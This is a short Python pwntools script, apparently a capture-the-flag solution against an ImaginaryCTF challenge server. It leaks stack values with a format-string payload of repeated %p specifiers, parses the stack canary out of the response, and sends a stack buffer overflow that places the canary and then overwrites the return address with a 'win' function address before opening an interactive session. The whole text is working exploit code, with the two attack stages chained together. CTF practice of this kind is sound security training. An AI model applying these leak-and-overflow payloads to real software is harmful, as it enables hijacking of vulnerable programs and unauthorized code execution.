from pwn import *

r = remote("puzzler7.imaginaryctf.org", 3003)

print(r.recvuntil(b"NAme?"))

win = 0x0000000000401182

payload = b"%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"
r.sendline(payload)

output = r.recvuntil(b"drINk?")
canary = int(output.split(b". WhAt")[0][-18:], 16)
print(hex(canary))

payload = b"a"*72 + p64(canary) + p64(0) + p64(win)
r.sendline(payload)
r.interactive()